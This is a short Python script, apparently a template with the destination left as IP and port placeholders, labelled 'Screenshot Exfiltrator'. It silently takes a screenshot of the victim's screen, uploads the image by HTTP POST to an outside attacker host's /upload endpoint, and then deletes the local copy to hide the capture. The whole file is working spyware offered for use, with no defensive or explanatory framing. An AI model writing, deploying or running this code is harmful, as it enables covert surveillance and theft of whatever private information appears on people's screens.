import time
import requests
import os

# Screenshot Exfiltrator
# Requires: pyautogui, requests
try:
    import pyautogui
except ImportError:
    print("pyautogui not installed.")
    exit()

def main():
    timestamp = int(time.time())
    filename = f"screenshot_{timestamp}.png"
    
    # Take screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
    # Exfiltrate
    url = "http://{{ ip }}:{{ port }}/upload"
    try:
        with open(filename, 'rb') as f:
            files = {'file': f}
            requests.post(url, files=files)
        print(f"Screenshot sent to {url}")
    except Exception as e:
        print(f"Exfiltration failed: {e}")
    finally:
        if os.path.exists(filename):
            os.remove(filename)

if __name__ == "__main__":
    main()
